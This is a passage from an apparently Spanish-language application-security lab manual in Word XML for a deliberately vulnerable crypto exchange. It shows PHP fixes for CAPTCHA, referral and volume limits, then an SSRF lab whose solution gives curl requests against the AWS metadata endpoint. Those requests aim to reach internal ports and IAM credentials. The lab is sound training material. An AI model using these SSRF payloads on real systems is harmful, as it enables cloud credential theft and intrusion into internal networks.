      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// register.php - Con validacion de CAPTCHA</w:t>
        <w:br/>
        <w:br/>
        <w:t>$captcha_response = $data['captcha_token'] ?? null;</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!$captcha_response) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Se requiere verificacion CAPTCHA"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar CAPTCHA con servicio externo (ej: hCaptcha)</w:t>
        <w:br/>
        <w:t>$verify_url = "https://hcaptcha.com/siteverify";</w:t>
        <w:br/>
        <w:t>$verify_data = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'secret' =&gt; getenv('HCAPTCHA_SECRET'),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'response' =&gt; $captcha_response</w:t>
        <w:br/>
        <w:t>];</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ch = curl_init($verify_url);</w:t>
        <w:br/>
        <w:t>curl_setopt($ch, CURLOPT_POST, true);</w:t>
        <w:br/>
        <w:t>curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($verify_data));</w:t>
        <w:br/>
        <w:t>curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</w:t>
        <w:br/>
        <w:t>$result = json_decode(curl_exec($ch), true);</w:t>
        <w:br/>
        <w:t>curl_close($ch);</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!$result['success']) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Verificacion CAPTCHA fallida"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Limitar Bonificaciones de Referidos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// register.php - Limites en el sistema de referidos</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!empty($data['referred_by'])) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $referral_code = $data['referred_by'];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Verificar cuantos referidos ya tiene este codigo</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "SELECT COUNT(*) as total_referrals FROM users WHERE referred_by = ?"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    );</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute([$referral_code]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $count = $stmt-&gt;fetch(PDO::FETCH_ASSOC)['total_referrals'];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $max_referrals = 20; // Maximo 20 referidos por usuario</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($count &gt;= $max_referrals) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        // No aplicar bono pero permitir el registro</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $apply_bonus = false;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    } else {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        // Verificar que la IP no haya registrado mas de 2 cuentas</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "SELECT COUNT(*) as ip_count FROM users WHERE registration_ip = ? AND created_at &gt; DATE_SUB(NOW(), INTERVAL 24 HOUR)"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;execute([$_SERVER['REMOTE_ADDR']]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $ip_count = $stmt-&gt;fetch(PDO::FETCH_ASSOC)['ip_count'];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        $apply_bonus = ($ip_count &lt; 2);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($apply_bonus) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        // Aplicar bonificacion</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "UPDATE wallets SET balance_usdt = balance_usdt + 10 WHERE user_id = (SELECT user_id FROM users WHERE referral_code = ?)"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;execute([$referral_code]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Limitar Volumen Diario de Operaciones</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// swap.php - Limite de volumen diario</w:t>
        <w:br/>
        <w:br/>
        <w:t>$stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "SELECT COALESCE(SUM(amount_usd), 0) as daily_volume</w:t>
        <w:br/>
        <w:t xml:space="preserve">     FROM swaps</w:t>
        <w:br/>
        <w:t xml:space="preserve">     WHERE user_id = ? AND created_at &gt; DATE_SUB(NOW(), INTERVAL 24 HOUR)"</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute([$user_id]);</w:t>
        <w:br/>
        <w:t>$daily_volume = $stmt-&gt;fetch(PDO::FETCH_ASSOC)['daily_volume'];</w:t>
        <w:br/>
        <w:br/>
        <w:t>$max_daily_volume = 50000; // Limite diario de 50,000 USD</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (($daily_volume + $swap_amount_usd) &gt; $max_daily_volume) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(429);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "error" =&gt; "Limite de volumen diario excedido",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "daily_volume" =&gt; $daily_volume,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "max_daily_volume" =&gt; $max_daily_volume,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "remaining" =&gt; $max_daily_volume - $daily_volume</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 07 - Server Side Request Forgery (SSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API7:2023 - Server Side Request Forgery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar vulnerabilidades de SSRF en la plataforma CryptoVulnX para:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Acceder a metadatos de la nube (AWS/GCP) a traves del endpoint de carga KYC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Realizar escaneo de puertos internos mediante el parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>file_url</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Acceder a servicios internos a traves de la funcionalidad de prueba de webhooks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad SSRF (Server Side Request Forgery) ocurre cuando una aplicacion del lado del servidor realiza solicitudes HTTP a URLs proporcionadas por el usuario sin validacion adecuada. Esto permite a un atacante hacer que el servidor actue como proxy para acceder a recursos internos que normalmente no serian accesibles desde el exterior.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX, existen dos endpoints vulnerables:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>KYC Upload</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/kyc/upload.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">): Para verificar la identidad del usuario, la plataforma permite subir documentos mediante una URL. El servidor descarga el archivo desde la URL proporcionada en el parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>file_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sin validar si la URL apunta a un recurso interno, a la instancia de metadatos de la nube, o a puertos de servicios internos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Webhook Notify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/webhook/notify.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">): La funcionalidad de webhooks permite al usuario configurar una URL de notificacion y probarla con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>action=test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. El servidor realiza una solicitud HTTP a la URL configurada y devuelve el cuerpo completo de la respuesta, incluyendo campos como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>response_body</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>effective_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>content_type</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ambos endpoints actuan como proxies no intencionados, permitiendo al atacante pivotar hacia la red interna.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/kyc/upload.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Carga de documentos KYC via URL (parametro </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>file_url</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/webhook/notify.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Prueba de webhook (parametro </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>action=test</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>webhook_url</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Media-Alta</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Requiere conocimiento de redes internas, servicios de metadatos en la nube y tecnicas de escaneo mediante SSRF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Reconocimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Observa el parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>file_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el endpoint de KYC. ¿Que sucede si en lugar de una URL publica proporcionas una URL que apunte a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://localhost</w:t>
      </w:r>
      <w:r>
        <w:t>? ¿El servidor intenta hacer la solicitud?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Servicios de metadatos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Los proveedores de nube (AWS, GCP, Azure) exponen metadatos de la instancia en direcciones IP especiales. En AWS, la direccion es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://169.254.169.254/latest/meta-data/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Si el servidor esta en la nube, intenta acceder a esta direccion a traves del parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>file_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Tambien prueba con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://localhost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> seguido de diferentes puertos comunes (3306, 6379, 5432, 8080).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Exfiltracion completa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint de webhook con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>action=test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> devuelve el cuerpo completo de la respuesta del servidor interno en el campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>response_body</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Configura un webhook apuntando a servicios internos como bases de datos, paneles de administracion o APIs internas. La respuesta incluye </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>effective_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>content_type</w:t>
      </w:r>
      <w:r>
        <w:t>, lo que te permite mapear la infraestructura interna.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 1: Acceso a Metadatos de la Nube via KYC Upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Autenticarse y obtener un token JWT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"user@test.com","password":"password123"}' | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python -c "import sys,json; print(json.load(sys.stdin)['token'])")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Enviar solicitud de KYC con URL apuntando a metadatos de AWS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_type": "passport",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "file_url": "http://169.254.169.254/latest/meta-data/"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Documento recibido para verificacion",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "file_content": "ami-id\nami-launch-index\nami-manifest-path\nhostname\niam/\ninstance-id\ninstance-type\nlocal-hostname\nlocal-ipv4\npublic-hostname\npublic-ipv4\nsecurity-credentials/",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "content_type": "text/plain",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "effective_url": "http://169.254.169.254/latest/meta-data/"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Profundizar para obtener credenciales IAM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_type": "passport",</w:t>
        <w:br/>
